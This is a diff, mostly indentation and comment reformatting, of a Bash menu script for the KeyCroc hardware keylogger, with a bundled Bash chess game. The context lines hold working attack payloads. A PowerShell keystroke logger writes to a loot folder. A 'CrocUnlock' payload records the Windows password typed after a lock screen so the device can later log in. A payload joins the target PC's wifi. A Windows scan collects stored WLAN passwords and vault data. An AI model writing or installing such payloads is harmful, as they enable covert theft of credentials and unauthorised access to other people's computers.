 	Q STRING "[System.IO.File]::AppendAllText(\$LOOTDIR, \$loggedchar, [System.Text.Encoding]::Unicode)"
 	Q ENTER 
@@ -812,11 +737,9 @@ else
 	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_}-->${clear}${OS_CHECK}\n"
 fi
 }
-
 ##
-#   - Getonline Payload Function
+#----Getonline Payload Function
 ##
-
 get_online_p() {
 	clear
 	local GETONLINE=/root/udisk/payloads/Getonline.txt
@@ -826,7 +749,7 @@ get_online_p() {
 -After install unplug and plug into windows pc and type in getonline\n
 -When done the led will light up green unplug keycroc and plug back in\n
 -The keycroc should now be connected to the target pc wifi\n')${clear}\n"
-	if [ -e "${GETONLINE}" ]; then
+if [ -e "${GETONLINE}" ]; then
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
 	local GET_ON='label=\"KeyCroc\"'
@@ -842,11 +765,9 @@ else
 	echo -ne "\n\e[40m${red}***${clear}\e[40m$(ColorGreen 'GETONLINE PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n"
 fi
 }
-
 ##
-#   - CrocUnlock Payload Function
+#----CrocUnlock Payload Function
 ##
-
 croc_unlock_p() {
 	clear
 	local CROCUNLOCK=/root/udisk/payloads/Croc_unlock_1.txt
@@ -862,7 +783,7 @@ croc_unlock_p() {
 --THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n 
 --AFTER THE USER HAS ENTER THE PASSWORD\n
 --WORK FOR PIN NUMBER TO AS LONG AS THE ENTER KEY HAS BE PRESSED AFTER')\n"
-	if [ -e "${CROCUNLOCK}" ]; then
+if [ -e "${CROCUNLOCK}" ]; then
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
 else
 	echo -e "# Title:           CrocUnlock (payload #1)\n# Description:     Log into windows pc\n# Author:          spywill / RootJunky\n# Version:         1.3\n# Category:        Key Croc\n#\n#\nMATCH (GUI-l|CONTROL-ALT-DELETE)\n#\nCROC_KEYS=/root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered\nCROC_UNLOCK=/root/udisk/payloads/Croc_unlock_2.txt\n#" >> ${CROCUNLOCK}
@@ -877,11 +798,9 @@ else
 	echo -ne "\n\e[40m${red}${LINE_}${clear}\e[40m$(ColorGreen 'CROCUNLOCK PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\e[40m${red}${LINE_}${clear}\n"
 fi
 }
-
 ##
-#   - Wifi Setup Payload Function
+#----Wifi Setup Payload Function
 ##
-
 wifi_setup_p() {
 	clear
 	echo -ne "$(Info_Screen '
@@ -891,16 +810,16 @@ wifi_setup_p() {
 -YOU CAN CREATE A PAYLOAD WITH MATCH WORD\n
 -CONNECT TO WIFI ACCESS POINT QUICKLY\n
 -BY TYPING YOUR MATCH WORD\n')${clear}\n"
-	while read -p "$(ColorBlue 'ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER]'): " USER_NAME_PL; do
+while read -p "$(ColorBlue 'ENTER A NAME FOR THIS PAYLOAD AND PRESS [ENTER]'): " USER_NAME_PL; do
 	local PAYLOAD_FOLDER=/root/udisk/payloads/${USER_NAME_PL}.txt
-	if [[ -e "${PAYLOAD_FOLDER}" ]]; then
+if [[ -e "${PAYLOAD_FOLDER}" ]]; then
 	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME')${clear}${LINE_}\n"
 else
 	touch ${PAYLOAD_FOLDER}
 	read -p "$(ColorBlue 'ENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER]'): " USER_MATCH
 	read -p "$(ColorBlue 'ENTER THE SSID AND PRESS [ENTER]'): " USER_SSID
 	read -p "$(ColorBlue 'ENTER THE PASSWORD AND PRESS [ENTER]'): " WIFI_PASS
-    echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
+	echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
 MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
 	echo -ne "\n${red}***${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}***${clear}\n
 $(Info_Screen '
@@ -908,15 +827,13 @@ $(Info_Screen '
 --TYPE IN YOUR MATCH WORD LED WILL LIGHT UP GREEN\n
 --THEN UNPLUG THE KEYCROC AND PLUG BACK IN\n
 --YOUR KEYCROC SHOULD NOW BE CONNECTED TO YOUR WIFI SETUP\n')${clear}\n"
-	break
- fi
+break
+fi
 done
 }
-
 ##
-#   - Windows Info Scan Function
+#----Windows Info Scan Function
 ##
-
 windows_check() {
 	clear
 	echo -ne "$(Info_Screen '
@@ -924,7 +841,6 @@ windows_check() {
 -This is an Bash Bunny payload working on the Croc\n
 -This will Scan an Windows pc and collect alot of information\n
 -Save to loot/Croc_pot folder\n')${clear}\n"
-
 start_win_stat() {
 	rm -f ${LOOT_WIND}
 	ATTACKMODE HID STORAGE
@@ -951,8 +867,8 @@ start_win_stat() {
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n"
-	if [ "${OS_CHECK}" = WINDOWS ]; then
-	if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
+if [ "${OS_CHECK}" = WINDOWS ]; then
+if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
 	start_win_stat | tee ${LOOT_WIND}
 else
 	sleep 1
@@ -981,17 +897,15 @@ Clear-Host\nWrite-Host\n\n\$computerSystem.Name\n\"${LINE}\"\n\"Manufacturer: \"
 computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,\nOutput,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,\nprocess,listener,listenerItem,process,service,software,drivers,videocard,\nvault -ErrorAction SilentlyContinue -Force" >> ${WIN_PS_A}
 	sleep 1
 	start_win_stat | tee ${LOOT_WIND}
-	fi
+fi
 else
 	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_} -->${clear} ${OS_CHECK}\n"
 fi
 cat ${LOOT_WIND}
 }
-
 ##
-#   - VPN SETUP-Start/stop Function
+#----VPN SETUP-Start/stop Function
 ##
-
 croc_vpn() {
 	local vpn_file_A=/etc/openvpn/*.ovpn
 	local vpn_file=/root/udisk/*.ovpn
@@ -1001,22 +915,19 @@ croc_vpn() {
 -place it on the keycroc root of the udisk\n
 -Then select #1 VPN SETUP to do the rest\n
 -Check to see if openvpn is installed if not installing it\n')${clear}\n"
- 
 setup_vpn() {
-
 ##
-#   - VPN Check/install openvpn
+#----VPN Check/install openvpn
 ##
 	local pkg_vpn=openvpn
 	local status_vpn="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg_vpn" 2>&1)"
-	if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
+if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
 	apt install $pkg_vpn
-	fi
-
+fi
 ##
-#   - VPN user input
+#----VPN user input
 ##
-	if [ -f ${vpn_file} ]; then
+if [ -f ${vpn_file} ]; then
 	echo -ne "\n$(ColorYellow 'FOUND .ovpn FILE MOVING IT TO ect/openvpn')\n"
 	find . -name *.ovpn -exec mv '{}' "/etc/openvpn/" ";"
 	touch /etc/openvpn/credentials
@@ -1028,11 +939,9 @@ else
 	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed 'DID NOT FIND .ovpn FILE ON THE KEYCROC UDISK')${LINE_}${clear}\n"
 fi
 }
-
 ##
-#   - VPN Menu
+#----VPN Menu
 ##
-
 MenuTitle VPN MENU
 MenuColor 1 VPN SETUP ; echo -ne "         ${clear}\n"
 MenuColor 2 ENABLE VPN ; echo -ne "        ${clear}\n"
@@ -1055,22 +964,18 @@ MenuEnd
 	*) invalid_entry ;;
 	esac
 }
-
 ##
-#   - Croc Pot Plus Pass time
+#----Croc Pot Plus Pass time
 ##
-
 pass_time() {
 	clear
 	echo -ne "$(Info_Screen '
 -I am not the developer of these script\n
 -Thought I would share them\n
 -Show the power of the keycroc and bash scripting\n')${clear}\n"
-
 ##
-#   - Pass time Chess
+#----Pass time Chess
 ##
-
 chess_game() {
 # Chess Bash
 # a simple chess game written in an inappropriate language :)
@@ -1080,7 +985,6 @@ chess_game() {
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
 # This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
 # You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-
 # Default values
 strength=3
 namePlayerA="Player"
@@ -1102,7 +1006,6 @@ cache=""
 cachecompress=false
 unicodelabels=true
 port=12433
-
 # internal values
 timestamp=$( date +%s%N )
 fifopipeprefix="/tmp/chessbashpipe"
@@ -1127,12 +1030,10 @@ hoverInit=false
 labelX=-2
 labelY=9
 type stty >/dev/null 2>&1 && useStty=true || useStty=false
-
 # Choose unused color for hover
 while (( colorHover == colorPlayerA || colorHover == colorPlayerB )) ; do
 	(( colorHover++ ))
 done
-
 # Check Unicode availbility
 # We do this using a trick: printing a special zero-length unicode char (http://en.wikipedia.org/wiki/Combining_Grapheme_Joiner) and retrieving the cursor position afterwards.
 # If the cursor position is at beginning, the terminal knows unicode. Otherwise it has printed some replacement character.
@@ -1145,12 +1046,10 @@ else
 	unicodelabels=false
 fi
 echo -e "\e[u\e8\e[2K\r\e[0m\nWelcome to \e[1mChessBa.sh\e[0m - a Chess game written in Bash \e[2mby Bernhard Heinloth, 2015\e[0m\n"
-
 # Print version information
 function version() {
 	echo "ChessBash 0.4"
 }
-
 # Wait for key press
 # no params/return
 function anyKey(){
@@ -1159,111 +1058,102 @@ function anyKey(){
 	read -sN1
 	$useStty && stty -echo
 }
-
 # Error message, p.a. on bugs
 # Params:
 #	$1	message
 # (no return value, exit game)
 function error() {
-	if $color ; then
-		echo -e "\e[0;1;41m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
-	else
-		echo -e "\e[0;1;7m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
-	fi
+if $color ; then
+	echo -e "\e[0;1;41m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
+else
+	echo -e "\e[0;1;7m $1 \e[0m\n\e[3m(Script exit)\e[0m" >&2
+fi
 	anyKey
-	exit 1
+exit 1
 }
-
 # Check prerequisits (additional executables)
 # taken from an old script of mine (undertaker-tailor)
 # Params:
 #	$1	name of executable
 function require() {
 	type "$1" >/dev/null 2>&1 ||
-		{
-			echo "This requires $1 but it is not available on your system. Aborting." >&2
-			exit 1
-		}
+	{
+		echo "This requires $1 but it is not available on your system. Aborting." >&2
+		exit 1
+	}
 }
-
 # Validate a number string
 # Params:
 #	$1	String with number
 # Return 0 if valid, 1 otherwise
 function validNumber() {
-	if [[ "$1" =~ ^[0-9]+$ ]] ; then
-		return 0
-	else
-		return 1
-	fi
+if [[ "$1" =~ ^[0-9]+$ ]] ; then
+	return 0
+else
+	return 1
+fi
 }
-
 # Validate a port string
 # Must be non privileged (>1023)
 # Params:
 #	$1	String with port number
 # Return 0 if valid, 1 otherwise
 function validPort() {
-	if validNumber "$1" && (( 1 < 65536 && 1 > 1023 )) ; then
-		return 0
-	else
-		return 1
-	fi
+if validNumber "$1" && (( 1 < 65536 && 1 > 1023 )) ; then
+	return 0
+else
+	return 1
+fi
 }
-
 # Validate an IP v4 or v6 address
 # source: http://stackoverflow.com/a/9221063
 # Params:
 #	$1	IP address to validate
 # Return 0 if valid, 1 otherwise
 function validIP() {
-	if [[ "$1" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]] ; then
-		return 0
-	else
-		return 1
-	fi
+if [[ "$1" =~ ^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))|((([0-9A-Fa-f]{1,4}:){7}([0-9A-Fa-f]{1,4}|:))|(([0-9A-Fa-f]{1,4}:){6}(:[0-9A-Fa-f]{1,4}|((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){5}(((:[0-9A-Fa-f]{1,4}){1,2})|:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3})|:))|(([0-9A-Fa-f]{1,4}:){4}(((:[0-9A-Fa-f]{1,4}){1,3})|((:[0-9A-Fa-f]{1,4})?:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){3}(((:[0-9A-Fa-f]{1,4}){1,4})|((:[0-9A-Fa-f]{1,4}){0,2}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){2}(((:[0-9A-Fa-f]{1,4}){1,5})|((:[0-9A-Fa-f]{1,4}){0,3}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(([0-9A-Fa-f]{1,4}:){1}(((:[0-9A-Fa-f]{1,4}){1,6})|((:[0-9A-Fa-f]{1,4}){0,4}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))|(:(((:[0-9A-Fa-f]{1,4}){1,7})|((:[0-9A-Fa-f]{1,4}){0,5}:((25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(\.(25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}))|:))))$ ]] ; then
+	return 0
+else
+	return 1
+fi
 }
-
 # Named ANSI colors
 declare -a colors=( "black" "red" "green" "yellow" "blue" "magenta" "cyan" "white" )
-
 # Retrieve ANSI color code from string
 # Black and white are ignored!
 # Params:
 #	$1	Color string
 # Return Color code or 0 if not a valid
 function getColor() {
-	local c
-	for (( c=1; c<7; c++ )) ; do
-		local v=${colors[$c]:0:1}
-		local i=${1:0:1}
-		if [[ "${v^^}" == "${i^^}" || "$c" -eq "$i" ]] ; then
-			return $c
-		fi
-	done
-	return 0
+local c
+for (( c=1; c<7; c++ )) ; do
+	local v=${colors[$c]:0:1}
+	local i=${1:0:1}
+if [[ "${v^^}" == "${i^^}" || "$c" -eq "$i" ]] ; then
+	return $c
+fi
+done
+return 0
 }
-
 # Check if ai player
 # Params:
 #	$1	player
 # Return status code 0 if ai player
 function isAI() {
-	if (( $1 < 0 )) ; then
-		if [[ "${namePlayerA,,}" == "${aikeyword,,}" ]] ; then
-			return 0
+if (( $1 < 0 )) ; then
+	if [[ "${namePlayerA,,}" == "${aikeyword,,}" ]] ; then
+		return 0
 		else
-			return 1
-		fi
-	else
-		if [[ "${namePlayerB,,}" == "${aikeyword,,}" ]] ; then
-			return 0
-		else
-			return 1
-		fi
+		return 1
 	fi
+else
+	if [[ "${namePlayerB,,}" == "${aikeyword,,}" ]] ; then
+		return 0
+	else
+		return 1
+	fi
+fi
 }
-
 # Help message
 # Writes text to stdout
 function help {
@@ -1314,113 +1204,111 @@ function help {
 	echo -e "Or just switch to a real chess game with great graphics and ai! ;)\e[0m"
 	echo
 }
-
 # Parse command line arguments
 while getopts ":a:A:b:B:c:P:s:t:w:dghilmMnpvVz" options; do
 	case $options in
-		a )	if [[ -z "$OPTARG" ]] ;then
-				echo "No valid name for first player specified!" >&2
-				exit 1
-			# IPv4 && IPv6 validation, source: http://stackoverflow.com/a/9221063
-			elif validIP "$OPTARG" ; then
-				remote=-1
-				remoteip="$OPTARG"
-			else
-				namePlayerA="$OPTARG"
-			fi
-			;;
-		A )	if ! getColor "$OPTARG" ; then
-				colorPlayerA=$?
-			else
-				echo "'$OPTARG' is not a valid color!" >&2
-				exit 1
-			fi
-			;;
-		b )	if [[ -z "$OPTARG" ]] ;then
-				echo "No valid name for second player specified!" >&2
-				exit 1
-			elif [[ "${OPTARG,,}" == "$remotekeyword" ]] ; then
-				remote=1
-			else
-				namePlayerB="$OPTARG"
-			fi
-			;;
-		B )	if ! getColor "$OPTARG" ; then
-				colorPlayerB=$?
-			else
-				echo "'$OPTARG' is not a valid color!" >&2
-				exit 1
-			fi
-			;;
-		s )	if validNumber "$OPTARG" ; then
-				strength=$OPTARG
-			else
-				echo "'$OPTARG' is not a valid strength!" >&2
-				exit 1
-			fi
-			;;
-		P )	if validPort "$OPTARG" ; then
-				port=$OPTARG
-			else
-				echo "'$OPTARG' is not a valid gaming port!" >&2
-				exit 1
-			fi
-			;;
-		w )	if validNumber "$OPTARG" ; then
-				sleep=$OPTARG
-			else
-				echo "'$OPTARG' is not a valid waiting time!" >&2
-				exit 1
-			fi
-			;;
-		c )	if [[ -z "$OPTARG" ]] ; then
-				echo "No valid path for cache file!" >&2
-				exit 1
-			else
-				cache="$OPTARG"
-			fi
-			;;
-		t )	if validNumber "$OPTARG" ; then
-				computer=$OPTARG
-			else
-				echo "'$OPTARG' is not a valid number for steps!" >&2
-				exit 1
-			fi
-			;;
-		d )	color=false
-			;;
-		g )	guiconfig=true
-			;;
-		l )	unicodelabels=false
-			;;
-		n )	colorFill=false
-			;;
-		m )	colorHelper=false
-			;;
-		M )	mouse=false
-			;;
-		p )	ascii=true
-			unicodelabels=false
-			;;
-		i )	warnings=true
-			;;
-		v )	version
-			;;
-		V )	cursor=false
-			;;
-		z )	require gzip
-			require zcat
-			cachecompress=true
-			;;
-		h )	help
-			exit 0
-			;;
-		\?)
-			echo "Invalid option: -$OPTARG" >&2
-			;;
+	a )	if [[ -z "$OPTARG" ]] ;then
+		echo "No valid name for first player specified!" >&2
+		exit 1
+# IPv4 && IPv6 validation, source: http://stackoverflow.com/a/9221063
+		elif validIP "$OPTARG" ; then
+		remote=-1
+		remoteip="$OPTARG"
+	else
+		namePlayerA="$OPTARG"
+	fi
+;;
+	A )	if ! getColor "$OPTARG" ; then
+		colorPlayerA=$?
+	else
+		echo "'$OPTARG' is not a valid color!" >&2
+		exit 1
+	fi
+;;
+	b )	if [[ -z "$OPTARG" ]] ;then
+		echo "No valid name for second player specified!" >&2
+		exit 1
+	elif [[ "${OPTARG,,}" == "$remotekeyword" ]] ; then
+		remote=1
+	else
+		namePlayerB="$OPTARG"
+	fi
+;;
+	B )	if ! getColor "$OPTARG" ; then
+		colorPlayerB=$?
+	else
+		echo "'$OPTARG' is not a valid color!" >&2
+	exit 1
+	fi
+;;
+	s )	if validNumber "$OPTARG" ; then
+		strength=$OPTARG
+	else
+		echo "'$OPTARG' is not a valid strength!" >&2
+	exit 1
+	fi
+;;
+	P )	if validPort "$OPTARG" ; then
+		port=$OPTARG
+	else
+		echo "'$OPTARG' is not a valid gaming port!" >&2
+		exit 1
+	fi
+;;
+	w )	if validNumber "$OPTARG" ; then
+		sleep=$OPTARG
+	else
+		echo "'$OPTARG' is not a valid waiting time!" >&2
+	exit 1
+	fi
+;;
+	c )	if [[ -z "$OPTARG" ]] ; then
+		echo "No valid path for cache file!" >&2
+		exit 1
+	else
+		cache="$OPTARG"
+	fi
+;;
+	t )	if validNumber "$OPTARG" ; then
+		computer=$OPTARG
+	else
+		echo "'$OPTARG' is not a valid number for steps!" >&2
+		exit 1
+	fi
+;;
+	d )	color=false
+		;;
+	g )	guiconfig=true
+		;;
+	l )	unicodelabels=false
+		;;
+	n )	colorFill=false
+		;;
+	m )	colorHelper=false
+		;;
+	M )	mouse=false
+		;;
+	p )	ascii=true
+		unicodelabels=false
+		;;
+	i )	warnings=true
+		;;
+	v )	version
+		;;
+	V )	cursor=false
+		;;
+	z )	require gzip
+		require zcat
+		cachecompress=true
+		;;
+	h )	help
+		exit 0
+		;;
+	\?)
+		echo "Invalid option: -$OPTARG" >&2
+		;;
 	esac
 done
-
 # get terminal dimension
 echo -en '\e[18t'
 if read -d "t" -s -t 1 tmp ; then
@@ -1431,11 +1319,9 @@ else
 	termHeight=24
 	termWidth=80
 fi
-
 # gui config
 if $guiconfig ; then
-
-	# find a dialog system
+# find a dialog system
 	if type gdialog >/dev/null 2>&1 ; then
 		dlgtool="gdialog"
 		dlgh=0
@@ -1452,8 +1338,7 @@ if $guiconfig ; then
 		dlgtool=""
 		error "The graphical configuration requires gdialog/zenity, dialog or at least whiptail - but none of them was found on your system. You have to use the arguments to configure the game unless you install one of the required tools..."
 	fi
-
-	# Output the type of the first player in a readable string
+# Output the type of the first player in a readable string
 	function typeOfPlayerA() {
 		if [[ "$remote" -eq "-1" ]] ; then
 			echo "Connect to $remoteip (Port $port)"
@@ -1466,8 +1351,7 @@ if $guiconfig ; then
 			return 0
 		fi
 	}
-
-	# Output the type of the second player in a readable string
+# Output the type of the second player in a readable string
 	function typeOfPlayerB() {
 		if [[ "$remote" -eq "1" ]] ; then
 			echo "Host server at port $port"
@@ -1480,11 +1364,10 @@ if $guiconfig ; then
 			return 0
 		fi
 	}
-
-	# Execute a dialog
-	# Params: Dialog params (variable length)
-	# Prints: Dialog output seperated by new lines
-	# Returns the dialog program return or 255 if no dialog tool available
+# Execute a dialog
+# Params: Dialog params (variable length)
+# Prints: Dialog output seperated by new lines
+# Returns the dialog program return or 255 if no dialog tool available
 	function dlg() {
 		if [[ -n "$dlgtool" ]] ; then
 			$dlgtool --backtitle "ChessBash" "$@" 3>&1 1>&2 2>&3 | sed -e "s/|/\n/g" | sort -u
@@ -1493,16 +1376,15 @@ if $guiconfig ; then
 			return 255
 		fi
 	}
-
-	# Print a message box with a warning/error message
-	# Params:
-	#	$1	Message
+# Print a message box with a warning/error message
+# Params:
+#	$1	Message
 	function dlgerror() {
-		#TODO: normal error
+#TODO: normal error
 		dlg --msgbox "$1" $dlgh $dlgw
 	}
-	# Start the dialog configuration
-	# Neither params nor return, this is just a function for hiding local variables!
+# Start the dialog configuration
+# Neither params nor return, this is just a function for hiding local variables!
 	function dlgconfig() {
 		local option_mainmenu_playerA="First Player"
 		local option_mainmenu_playerB="Second Player"
@@ -1514,20 +1396,20 @@ if $guiconfig ; then
 		local dlg_main
 		while dlg_main=$(dlg --ok-button "Edit" --cancel-button "Start Game" --menu "New Game" $dlgh $dlgw 0 "$option_mainmenu_playerA" "$(typeOfPlayerA || true)" "$option_mainmenu_playerB" "$(typeOfPlayerB || true )" "$option_mainmenu_settings" "Color, Unicode, Mouse & AI Cache") ; do
 			case "$dlg_main" in
-				# Player A settings
+# Player A settings
 				"$option_mainmenu_playerA" )
 					typeOfPlayerA > /dev/null
 					local type=$?
 					local dlg_player
 					dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerA" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Connect to Server $remoteip" )
 					case "$dlg_player" in
-						# Human --> get Name
+# Human --> get Name
 						*"${option_player[0]}"* )
 							[[ "$remote" -eq "-1" ]] && remote=0
 							local dlg_namePlayer
 							dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerA" $dlgh $dlgw "$( isAI $A && echo "$option_mainmenu_playerA" || echo "$namePlayerA" )") && namePlayerA="$dlg_namePlayer"
 							;;
-						# Computer --> get Strength
+# Computer --> get Strength
 						*"${option_player[1]}"* )
 							[[ "$remote" -eq "-1" ]] && remote=0
 							namePlayerA=$aikeyword
@@ -1540,7 +1422,7 @@ if $guiconfig ; then
 								fi
 							fi
 							;;
-						# Network --> get Server and Port
+# Network --> get Server and Port
 						*"${option_player[2]}"* )
 							local dlg_remoteip
 							if dlg_remoteip=$(dlg --inputbox "IP(v4 or v6) address of Server" $dlgh $dlgw "$remoteip") ; then
@@ -1562,7 +1444,7 @@ if $guiconfig ; then
 							fi
 							;;
 					esac
-					# Player color
+# Player color
 					if $color ; then
 						local colorlist=""
 						local c
@@ -1575,20 +1457,20 @@ if $guiconfig ; then
 						fi
 					fi
 					;;
-				# Player B settings
+# Player B settings
 				"$option_mainmenu_playerB" )
 					typeOfPlayerB > /dev/null
 					local type=$?
 					local dlg_player
 					dlg_player=$(dlg --nocancel --default-item "${option_player[$type]}" --menu "$option_mainmenu_playerB" $dlgh $dlgw 0 "${option_player[0]}" "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )" "${option_player[1]}" "with AI (of strength $strength)" "${option_player[2]}" "Wait for connections on port $port" )
 					case "$dlg_player" in
-						# Human --> get Name
+# Human --> get Name
 						*"${option_player[0]}"* )
 							[[ "$remote" -eq "1" ]] && remote=0
 							local dlg_namePlayer
 							dlg_namePlayer=$(dlg --inputbox "Name of $option_mainmenu_playerB" $dlgh $dlgw "$( isAI $B && echo "$option_mainmenu_playerB" || echo "$namePlayerB" )") && namePlayerA="$dlg_namePlayer"
 							;;
-						# Computer --> get Strength
+# Computer --> get Strength
 						*"${option_player[1]}"* )
 							[[ "$remote" -eq "1" ]] && remote=0
 							namePlayerB=$aikeyword
@@ -1601,7 +1483,7 @@ if $guiconfig ; then
 								fi
 							fi
 							;;
-						# Network --> get Server and Port
+# Network --> get Server and Port
 						*"${option_player[2]}"* )
 							remote=1
 							local dlg_networkport
@@ -1614,7 +1496,7 @@ if $guiconfig ; then
 							fi
 							;;
 					esac
-					# Player color
+# Player color
 					if $color ; then
 						local colorlist=""
 						local c
@@ -1627,10 +1509,10 @@ if $guiconfig ; then
 						fi
 					fi
 					;;
-				# Game settings
+# Game settings
 				"$option_mainmenu_settings" )
